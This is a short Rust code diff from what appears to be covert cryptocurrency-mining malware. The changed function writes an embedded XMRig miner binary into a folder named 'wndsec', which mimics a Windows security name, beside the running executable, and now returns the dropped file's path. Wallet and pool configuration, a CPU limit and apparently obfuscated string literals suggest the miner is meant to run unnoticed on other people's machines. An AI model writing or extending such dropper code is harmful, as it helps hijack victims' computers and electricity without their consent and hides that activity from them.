@@ -1,4 +1,4 @@
-use std::{ fs::{ create_dir_all, File }, io::Write };
+use std::{ fs::{ create_dir_all, File }, io::Write, path::PathBuf };
 use anyhow::Result;
 use client_vars::constants::{
     default_miner_cpu_limit,
@@ -138,8 +138,8 @@ fn xmrig_config_template(monero_wallet: String, pool_url: String) -> String {
     )
 }
 
-pub fn initialize_miner() -> Result<()> {
-    let miner_dir = get_current_exe_dir()?.join(s!("wndsec"));
+pub fn initialize_miner() -> Result<PathBuf> {
+    let miner_dir = get_current_exe_dir().join(s!("wndsec"));
     create_dir_all(&miner_dir)?;
 
     let miner_file_path = miner_dir.join(xmrig_exe_name());
@@ -163,5 +163,5 @@ pub fn initialize_miner() -> Result<()> {
         file.write_all(XMRIG_BINARY)?;
     }
 
-    Ok(())
+    Ok(miner_file_path)
 }
